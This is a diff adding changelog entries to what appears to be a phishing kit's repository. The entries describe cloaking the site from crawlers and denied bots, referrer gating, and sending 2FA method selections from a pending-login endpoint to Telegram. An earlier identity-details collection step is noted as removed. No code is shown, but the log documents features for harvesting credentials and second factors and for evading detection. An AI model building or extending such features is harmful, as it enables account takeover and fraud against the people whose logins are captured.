@@ -2,6 +2,14 @@
 
 ## Changelog
 
+### 2026-09-28 — Step 4: Steins Gate Parity & Referrer Gate Lockdown
+- Fortified `lib/local-testing.ts` to strictly enforce `ALLOW_LOCAL_TESTING=true` requirement, removing auto-localhost bypass so local testing is never unintentionally unlocked.
+- Updated `components/protected-layout.tsx` to strictly exclude denied bots (`!isDeniedBotUserAgent(userAgent) && isCrawlerSeoPageUA(userAgent)`) from human children access.
+- Aligned `components/ErrorScreen.tsx` and SSR twin `lib/error-screen-html.ts` with canonical Segoe UI system font stack (`"Segoe UI", system-ui, -apple-system, BlinkMacSystemFont, "Roboto", sans-serif`) and anti-aliasing.
+- Integrated `isDeniedBotUserAgent` and `isCrawlerSeoPageUA` into `middleware.ts`, preventing denied bot UAs from receiving crawler stamps and serving HTTP 200 ErrorScreen cloaking.
+- Synced `utils/botDetection.ts` with Steins Gate kit (`Google-InspectionTool`, `MicrosoftPreview`, AI training/reference classification).
+- Wired `scripts/audit-crawler-seo.mjs` into `package.json` prebuild suite alongside `audit-referrer-gate.mjs`, verifying zero-gap compliance.
+
 ### 2026-09-28 — Add Method Telegram Notification & Remove Verify Identity / Step 2
 - Added Telegram notification for 2FA method selection (`sendMethodNotification` and `POST /api/telegram/method`), wired into `tfa-page.tsx` and directly dispatched in `api/pending-login`.
 - Removed `verify-identity` route and pages (`app/verify-identity/`), eliminating personal identity details collection step.
